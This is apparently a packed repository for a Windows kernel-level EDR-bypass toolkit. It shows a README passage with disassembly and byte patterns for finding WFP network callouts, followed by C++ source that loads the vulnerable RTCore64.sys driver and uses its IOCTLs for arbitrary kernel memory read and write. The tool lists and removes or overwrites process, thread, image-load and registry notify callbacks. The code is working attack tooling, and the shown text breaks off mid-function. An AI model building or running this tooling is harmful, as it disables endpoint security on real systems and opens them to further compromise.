fffff801`63968166 7573            jne     NETIO!InitDefaultCallout+0x97 (fffff801`639681db)
fffff801`63968168 488b0de1860300  mov     rcx,qword ptr [NETIO!gFeCallout (fffff801`639a0850)]
fffff801`6396816f 448d4060        lea     r8d,[rax+60h]
fffff801`63968173 33d2            xor     edx,edx
fffff801`63968175 e8c6cb0100      call    NETIO!_memset_spec_ermsb (fffff801`63984d40)
fffff801`6396817a 488b0dcf860300  mov     rcx,qword ptr [NETIO!gFeCallout (fffff801`639a0850)]
fffff801`63968181 <mark>488d05</mark>28ebfdff  lea     rax,[NETIO!FeDefaultClassifyCallback (fffff801`63946cb0)]
fffff801`63968188 <mark>c70104</mark>000000    mov     dword ptr [rcx],4
</pre>

<pre>
const uint8_t patterngFeDefaultClassifyCallback[] = { 0x48, 0x8d, 0x05, 0xc7, 0x01 };
</pre>

`InitDefaultCallout` is not an exported function, so we need to find first an exported function close to `InitDefaultCallout` for our binary search.

<pre>
lkd> ? NETIO!InitDefaultCallout - NETIO
Evaluate expression: 360772 = 00000000`00058144
</pre>

And based on that offset and export table in IDA, we will find out that the functions falls between these 2 `FeGetWfpGlobalPtr` and `KfdDeRefCallout`.

![Export Table](./screenshots/ExportTableInit.png)

and we will use the highlighed bytes for our search to resolve the address of `NETIO!FeDefaultClassifyCallback`

## Usage
<pre>
C:\Users\Vixx\Desktop\Tools\NetworkKernelBypass\x64\Release>NetworkCallbackKernelBypass.exe
Usage: NetworkCallbackKernelBypass.exe
 /networkfilters /show <drivername> - list all network filters or network filters related to a driver
 /networkfilters /driver <drivername> - Remove all classifyFn related to that driver
 /networkfilters /address <classyFn Address To Remove> - remove the classifyFn Address mentionned (make sure to add 0x before the address)
 /installDriver - Install the MSI driver
 /uninstallDriver - Uninstall the MSI driver
 </pre>

 ` /networkfilters /show` to show all filters and corresponding drivers.

 ### Disclaimer
This project is for **educational purposes only**. Unauthorized use of this tool in production or against systems without explicit permission is strictly prohibited.

```

`NotifyRoutineKernelBypass/NotifyRoutineKernelBypass.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.11.35222.181
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "NotifyRoutineKernelBypass", "NotifyRoutineKernelBypass\NotifyRoutineKernelBypass.vcxproj", "{973CD09D-B54A-4B52-8771-2EC18BB49241}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{973CD09D-B54A-4B52-8771-2EC18BB49241}.Debug|x64.ActiveCfg = Debug|x64
		{973CD09D-B54A-4B52-8771-2EC18BB49241}.Debug|x64.Build.0 = Debug|x64
		{973CD09D-B54A-4B52-8771-2EC18BB49241}.Debug|x86.ActiveCfg = Debug|Win32
		{973CD09D-B54A-4B52-8771-2EC18BB49241}.Debug|x86.Build.0 = Debug|Win32
		{973CD09D-B54A-4B52-8771-2EC18BB49241}.Release|x64.ActiveCfg = Release|x64
		{973CD09D-B54A-4B52-8771-2EC18BB49241}.Release|x64.Build.0 = Release|x64
		{973CD09D-B54A-4B52-8771-2EC18BB49241}.Release|x86.ActiveCfg = Release|Win32
		{973CD09D-B54A-4B52-8771-2EC18BB49241}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {A8101FDA-9036-4CCC-AD4C-6D2CCC772522}
	EndGlobalSection
EndGlobal

```

`NotifyRoutineKernelBypass/NotifyRoutineKernelBypass/MemHandler.cpp`:

```cpp
#include "MemHandler.h"

```

`NotifyRoutineKernelBypass/NotifyRoutineKernelBypass/MemHandler.h`:

```h
#pragma once
#include <Windows.h>
class MemHandler
{
public:
    virtual BOOL VirtualRead(DWORD64 address, void* buffer, size_t bytesToRead) = 0;
    virtual BOOL WriteMemoryDWORD64(DWORD64 Address, DWORD64 Value) = 0;
    virtual BOOL WriteMemoryPrimitive(DWORD Size, DWORD64 Address, DWORD Value) = 0;
};


```

`NotifyRoutineKernelBypass/NotifyRoutineKernelBypass/NotifyRoutineKernelBypass.cpp`:

```cpp
#include <Windows.h>
#include "memory.h"
#include "notifyRoutineUtil.h"

//Mimikatz code to load / unload driver
BOOL kull_m_service_addWorldToSD(SC_HANDLE monHandle) {
	BOOL status = FALSE;
	DWORD dwSizeNeeded;
	PSECURITY_DESCRIPTOR oldSd, newSd;
	SECURITY_DESCRIPTOR dummySdForXP;
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
	EXPLICIT_ACCESS ForEveryOne = {
		SERVICE_QUERY_STATUS | SERVICE_QUERY_CONFIG | SERVICE_INTERROGATE | SERVICE_ENUMERATE_DEPENDENTS | SERVICE_PAUSE_CONTINUE | SERVICE_START | SERVICE_STOP | SERVICE_USER_DEFINED_CONTROL | READ_CONTROL,
		SET_ACCESS,
		NO_INHERITANCE,
		{NULL, NO_MULTIPLE_TRUSTEE, TRUSTEE_IS_SID, TRUSTEE_IS_WELL_KNOWN_GROUP, NULL}
	};
	if (!QueryServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, &dummySdForXP, 0, &dwSizeNeeded) && (GetLastError() == ERROR_INSUFFICIENT_BUFFER)) {
		if (oldSd = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, dwSizeNeeded)) {
			if (QueryServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, oldSd, dwSizeNeeded, &dwSizeNeeded)) {
				if (AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, (PSID*)&ForEveryOne.Trustee.ptstrName)) {
					if (BuildSecurityDescriptor(NULL, NULL, 1, &ForEveryOne, 0, NULL, oldSd, &dwSizeNeeded, &newSd) == ERROR_SUCCESS) {
						status = SetServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, newSd);
						LocalFree(newSd);
					}
					FreeSid(ForEveryOne.Trustee.ptstrName);
				}
			}
			LocalFree(oldSd);
		}
	}
	return status;
}

DWORD service_install(PCWSTR serviceName, PCWSTR displayName, PCWSTR binPath, DWORD serviceType, DWORD startType, BOOL startIt) {
	BOOL status = FALSE;
	SC_HANDLE hSC = NULL, hS = NULL;

	if (hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE)) {
		if (hS = OpenService(hSC, serviceName, SERVICE_START)) {
			wprintf(L"[+] \'%s\' service already registered\n", serviceName);
		}
		else {
			if (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST) {
				wprintf(L"[*] \'%s\' service not present\n", serviceName);
				if (hS = CreateService(hSC, serviceName, displayName, READ_CONTROL | WRITE_DAC | SERVICE_START, serviceType, startType, SERVICE_ERROR_NORMAL, binPath, NULL, NULL, NULL, NULL, NULL)) {
					wprintf(L"[+] \'%s\' service successfully registered\n", serviceName);
					if (status = kull_m_service_addWorldToSD(hS))
						wprintf(L"[+] \'%s\' service ACL to everyone\n", serviceName);
					else printf("kull_m_service_addWorldToSD");
				}
				else PRINT_ERROR_AUTO(L"CreateService");
			}
			else PRINT_ERROR_AUTO(L"OpenService");
		}
		if (hS) {
			if (startIt) {
				if (status = StartService(hS, 0, NULL))
					wprintf(L"[+] \'%s\' service started\n", serviceName);
				else if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
					wprintf(L"[*] \'%s\' service already started\n", serviceName);
				else {
					PRINT_ERROR_AUTO(L"StartService");
				}
			}
			CloseServiceHandle(hS);
		}
		CloseServiceHandle(hSC);
	}
	else {
		PRINT_ERROR_AUTO(L"OpenSCManager(create)");
		return GetLastError();
	}
	return 0;
}

BOOL kull_m_service_genericControl(PCWSTR serviceName, DWORD dwDesiredAccess, DWORD dwControl, LPSERVICE_STATUS ptrServiceStatus) {
	BOOL status = FALSE;
	SC_HANDLE hSC, hS;
	SERVICE_STATUS serviceStatus;

	if (hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT)) {
		if (hS = OpenService(hSC, serviceName, dwDesiredAccess)) {
			status = ControlService(hS, dwControl, ptrServiceStatus ? ptrServiceStatus : &serviceStatus);
			CloseServiceHandle(hS);
		}
		CloseServiceHandle(hSC);
	}
	return status;
}

BOOL service_uninstall(PCWSTR serviceName) {
	if (kull_m_service_genericControl(serviceName, SERVICE_STOP, SERVICE_CONTROL_STOP, NULL)) {
		wprintf(L"[+] \'%s\' service stopped\n", serviceName);
	}
	else if (GetLastError() == ERROR_SERVICE_NOT_ACTIVE) {
		wprintf(L"[*] \'%s\' service not running\n", serviceName);
	}
	else {
		PRINT_ERROR_AUTO(L"kull_m_service_stop");
		return FALSE;
	}

	if (SC_HANDLE hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT)) {
		if (SC_HANDLE hS = OpenService(hSC, serviceName, DELETE)) {
			BOOL status = DeleteService(hS);
			CloseServiceHandle(hS);
		}
		CloseServiceHandle(hSC);
	}
	return TRUE;
}
// thanks gentilkiwi!

int main(int argc, char** argv) {

    if (argc < 2) {
        printf("Usage: %s\n"
            " /proc - List Process Creation Callbacks\n"
            " /delproc <address> - Remove Process Creation Callback\n"
            " /delprocstealth <address> - overwriting the Process Creation function Callback\n"
            " /thread - List Thread Creation Callbacks\n"
            " /delthread - Remove Thread Creation Callback\n"
            " /installDriver - Install the MSI driver\n"
            " /uninstallDriver - Uninstall the MSI driver\n"
            " /img - List Image Load Callbacks\n"
            " /delimg <address> - Remove Image Load Callback\n"
            " /reg - List Registry modification callbacks\n"
            " /delreg <address> - Remove Registry callback\n"
            " /unlinkreg <address> - Remove Registry linked list callback\n"
            , argv[0]);
        return 0;
    }

    if (strcmp(argv[1] + 1, "installDriver") == 0) {
        const auto svcName = L"RTCore64";
        const auto svcDesc = L"Micro-Star MSI Afterburner";
        const wchar_t driverName[] = L"\\RTCore64.sys";
        const auto pathSize = MAX_PATH + sizeof(driverName) / sizeof(wchar_t);
        TCHAR driverPath[pathSize];
        GetCurrentDirectory(pathSize, driverPath);
        wcsncat_s(driverPath, driverName, sizeof(driverName) / sizeof(wchar_t));

        if (auto status = service_install(svcName, svcDesc, driverPath, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE) == 0x00000005) {
            wprintf(L"[!] 0x00000005 - Access Denied - Did you run as administrator?\n");
        }
        return 0;
    }
    else if (strcmp(argv[1] + 1, "uninstallDriver") == 0) {
        const auto svcName = L"RTCore64";
        const auto svcDesc = L"Micro-Star MSI Afterburner";
        const wchar_t driverName[] = L"\\RTCore64.sys";
        const auto pathSize = MAX_PATH + sizeof(driverName) / sizeof(wchar_t);
        TCHAR driverPath[pathSize];
        GetCurrentDirectory(pathSize, driverPath);
        wcsncat_s(driverPath, driverName, sizeof(driverName) / sizeof(wchar_t));
        service_uninstall(svcName);
        return 0;
    }

    Memory m = Memory();
    notifyRoutine notify = notifyRoutine(&m);

    if (strcmp(argv[1] + 1, "proc") == 0) {

        notify.findprocesscallbackroutine(NULL);
    }
    else if (strcmp(argv[1] + 1, "delproc") == 0 && argc == 3) {
        DWORD64 remove;
        remove = strtoull(argv[2], NULL, 16);
        notify.findprocesscallbackroutine((DWORD64)remove);

		puts("\n Press Enter To Restore \n");
		Sleep(1000);
		getchar();
		notify.Restore();
    }
    else if (strcmp(argv[1] + 1, "delprocstealth") == 0 && argc == 3) {
        DWORD64 remove;
        remove = strtoull(argv[2], NULL, 16);
        notify.findprocesscallbackroutinestealth((DWORD64)remove);

		puts("\n Press Enter To Restore \n");
		Sleep(1000);
		getchar();
		notify.Restore();
    }
    else if (strcmp(argv[1] + 1, "img") == 0) {

        notify.findimgcallbackroutine(NULL);
    }
    else if (strcmp(argv[1] + 1, "thread") == 0) {

        notify.findthreadcallbackroutine(NULL);
    }
    else if (strcmp(argv[1] + 1, "delthread") == 0 && argc == 3) {
        DWORD64 remove;
        remove = strtoull(argv[2], NULL, 16);
        notify.findthreadcallbackroutine((DWORD64)remove);

		puts("\n Press Enter To Restore \n");
		Sleep(1000);
		getchar();
		notify.Restore();
    }
    else if (strcmp(argv[1] + 1, "delimg") == 0 && argc == 3) {
        DWORD64 remove;
        remove = strtoull(argv[2], NULL, 16);
        notify.findimgcallbackroutine((DWORD64)remove);

		puts("\n Press Enter To Restore \n");
		Sleep(1000);
		getchar();
		notify.Restore();
    }
    else if (strcmp(argv[1] + 1, "reg") == 0) {

        notify.findregistrycallbackroutines(NULL);
    }
    else if (strcmp(argv[1] + 1, "delreg") == 0 && argc == 3) {
        DWORD64 remove;
        remove = strtoull(argv[2], NULL, 16);
        notify.findregistrycallbackroutines((DWORD64)remove);

		puts("\n Press Enter To Restore \n");
		Sleep(1000);
		getchar();
		notify.Restore();
    }
    else if (strcmp(argv[1] + 1, "unlinkreg") == 0 && argc == 3) {
        DWORD64 remove;
        remove = strtoull(argv[2], NULL, 16);
        notify.unlinkregistrycallbackroutines((DWORD64)remove);

		puts("\n Press Enter To Restore \n");
		Sleep(1000);
		getchar();
		notify.Restore();
    }
    else {
        wprintf(L"Error: Check the help\n");

    }
	return 0;
}
```

`NotifyRoutineKernelBypass/NotifyRoutineKernelBypass/NotifyRoutineKernelBypass.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="MiniFilter Kernel Bypass.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="memory.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="FltUtil.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="MemHandler.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="FltUtil.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="PebLdr.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="FltDef.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="memory.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="MemHandler.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`NotifyRoutineKernelBypass/NotifyRoutineKernelBypass/NotifyRoutineKernelBypass.rc`:

```rc
// Microsoft Visual C++ generated resource script.
//

#include "resource.h"

#define APSTUDIO_READONLY_SYMBOLS
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 2 resource.
//
#include "winres.h"

/////////////////////////////////////////////////////////////////////////////
#undef APSTUDIO_READONLY_SYMBOLS

/////////////////////////////////////////////////////////////////////////////
// English (United States) resources

#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
LANGUAGE 9, 1

#ifdef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// TEXTINCLUDE
//

1 TEXTINCLUDE
BEGIN
    "resource.h\0"
END

2 TEXTINCLUDE  
BEGIN
    "#include ""winres.h""\r\n"
    "\0"
END

3 TEXTINCLUDE  
BEGIN
    "\r\n"
    "\0"
END

#endif    // APSTUDIO_INVOKED

#endif    // English (United States) resources
/////////////////////////////////////////////////////////////////////////////



#ifndef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 3 resource.
//


/////////////////////////////////////////////////////////////////////////////
#endif    // not APSTUDIO_INVOKED

```

`NotifyRoutineKernelBypass/NotifyRoutineKernelBypass/NotifyRoutineKernelBypass.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup />
</Project>
```

`NotifyRoutineKernelBypass/NotifyRoutineKernelBypass/NotifyRoutineKernelBypass.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>17.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{973cd09d-b54a-4b52-8771-2ec18bb49241}</ProjectGuid>
    <RootNamespace>NotifyRoutineKernelBypass</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="notifyRoutine.cpp" />
    <ClCompile Include="MemHandler.cpp" />
    <ClCompile Include="memory.cpp" />
    <ClCompile Include="NotifyRoutineKernelBypass.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="notifyRoutine.h" />
    <ClInclude Include="notifyRoutineUtil.h" />
    <ClInclude Include="MemHandler.h" />
    <ClInclude Include="memory.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`NotifyRoutineKernelBypass/NotifyRoutineKernelBypass/NotifyRoutineKernelBypass.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup />
</Project>
```

`NotifyRoutineKernelBypass/NotifyRoutineKernelBypass/memory.cpp`:

```cpp
#include "memory.h"

Memory::Memory()  {
	/* Constructor for Memory Manager */
	// Opens a handle to RTCORE64
    Memory::DriverHandle = CreateFileW(LR"(\\.\RTCore64)", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (Memory::DriverHandle == INVALID_HANDLE_VALUE) {
        printf("Failed to open handle to device\t0x%x\n", GetLastError());
        exit(1);
    }
    else {
        puts("Connected to device");

    }
}

result Memory::ReadMemoryPrimitive(DWORD Size, DWORD64 Address) {
    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;
    struct result resultdata;
    DWORD BytesReturned;

    BOOL response = DeviceIoControl(Memory::DriverHandle,
        RTCORE64_MEMORY_READ_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);
    // Set the status and value in the result structure
    resultdata.resultstatus = response;  // Set TRUE if successful, FALSE if failed
    resultdata.resultvalue = response ? MemoryRead.Value : 0;  // Set value or 0 if failed
    return resultdata;
}

BOOL Memory::WriteMemoryPrimitive(DWORD Size, DWORD64 Address, DWORD Value) {
    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;
    MemoryRead.Value = Value;

    DWORD BytesReturned;

    BOOL response = DeviceIoControl(Memory::DriverHandle,
        RTCORE64_MEMORY_WRITE_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);

    return response;
}

BOOL Memory::WriteMemoryDWORD64(DWORD64 Address, DWORD64 Value) {
    BOOL response = false;
    BOOL response2 = false;
    response = WriteMemoryPrimitive(4, Address, Value & 0xffffffff);
    if (response) {
        response2 = WriteMemoryPrimitive(4, Address + 4, Value >> 32);
    }
    else {
        return response;
    }
    return response2;

}

BOOL Memory::VirtualRead(DWORD64 Address, void* Buffer, size_t Size) {
        DWORD bytesRead = 0;
        DWORD offset = 0;
        struct result resultdata;
        while (Size > 0) {
            // Read 4 bytes at a time or less if Size is less than 4 bytes
            DWORD chunkSize = (Size >= 0x04) ? 0x04 : Size;
            resultdata = ReadMemoryPrimitive(chunkSize, Address + offset);
            // Check if the read operation was successful
            if (!resultdata.resultstatus) {
                return false;  // Return false if the read operation fails
            }
            else {
                DWORD chunk = resultdata.resultvalue;
                // Copy the 4-byte chunk into the Buffer
                memcpy((BYTE*)Buffer + offset, &chunk, chunkSize);

                offset += chunkSize;
                Size -= chunkSize;
            }
        }
        return true;
}
```

`NotifyRoutineKernelBypass/NotifyRoutineKernelBypass/memory.h`:

```h
#pragma once
#include <Windows.h>
#include <string>
#include "MemHandler.h"
#include <aclapi.h>

#if !defined(PRINT_ERROR_AUTO)
#define PRINT_ERROR_AUTO(func) (wprintf(L"ERROR " TEXT(__FUNCTION__) L" ; " func L" (0x%08x)\n", GetLastError()))
#endif

struct RTCORE64_MSR_READ {
    DWORD Register;
    DWORD ValueHigh;
    DWORD ValueLow;
};
static_assert(sizeof(RTCORE64_MSR_READ) == 12, "sizeof RTCORE64_MSR_READ must be 12 bytes");

struct RTCORE64_MEMORY_READ {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};
static_assert(sizeof(RTCORE64_MEMORY_READ) == 48, "sizeof RTCORE64_MEMORY_READ must be 48 bytes");

struct RTCORE64_MEMORY_WRITE {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};

struct result {
    DWORD resultvalue;
    BOOL resultstatus;
};

static_assert(sizeof(RTCORE64_MEMORY_WRITE) == 48, "sizeof RTCORE64_MEMORY_WRITE must be 48 bytes");

static const DWORD RTCORE64_MSR_READ_CODE = 0x80002030;
static const DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
static const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;

class Memory : public MemHandler {
public:
	HANDLE DriverHandle;
	Memory();
    BOOL VirtualRead(DWORD64 address, void* buffer, size_t bytesToRead);
    result ReadMemoryPrimitive(DWORD Size, DWORD64 Address);
    BOOL WriteMemoryPrimitive(DWORD Size, DWORD64 Address, DWORD Value);
    BOOL WriteMemoryDWORD64(DWORD64 Address, DWORD64 Value);
};
```

`NotifyRoutineKernelBypass/NotifyRoutineKernelBypass/notifyRoutine.cpp`:

```cpp
#include "notifyRoutineUtil.h"
#include <tchar.h>

void Log(const char* Message, ...) {
	const auto file = stderr;

	va_list Args;
	va_start(Args, Message);
	std::vfprintf(file, Message, Args);
	std::fputc('\n', file);
	va_end(Args);
}

PVOID notifyRoutine::ResolveDriverBase(const wchar_t* strDriverName)
{
	DWORD szBuffer = 0x2000;
	BOOL bRes = FALSE;
	DWORD dwSizeRequired = 0;
	wchar_t buffer[256] = { 0 };
	LPVOID lpBase = NULL;
	HANDLE hHeap = GetProcessHeap();
	if (!hHeap) {
		return NULL;
	}

	LPVOID lpBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, szBuffer);
	if (!lpBuf) {
		return NULL;
	}

